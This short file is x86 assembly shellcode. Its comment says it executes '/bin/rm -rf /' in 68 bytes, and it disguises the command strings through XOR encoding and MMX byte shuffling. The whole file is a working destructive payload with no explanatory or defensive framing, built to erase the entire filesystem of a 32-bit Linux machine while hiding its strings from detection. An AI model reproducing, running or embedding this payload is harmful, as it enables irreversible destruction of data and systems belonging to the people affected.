BITS 32

section .text
global _start

; execve("/bin/rm", {"/bin/rm", "-rf", "/", 0}, 0) - 68 bytes
_start:
	push 0xabd9c5c9
	push 0xc684c284
	movd mm0, [esp]
	movd mm1, [esp+4h]
	punpcklbw mm0, mm1
	mov ebx, esp
	movq [ebx], mm0
	xor ecx,ecx
	imul ecx
	push 0x2f
	mov ecx, esp
	push 0xabcdd986
	mov edx, esp
	mov esi, 0xabababab
	xor dword [edx], esi
	pushad
	lea ecx, [esp+10h]
	cdq
	add al, 0xb
	xor dword [ebx], esi
	xor dword [ebx+4h], esi
	int 0x80
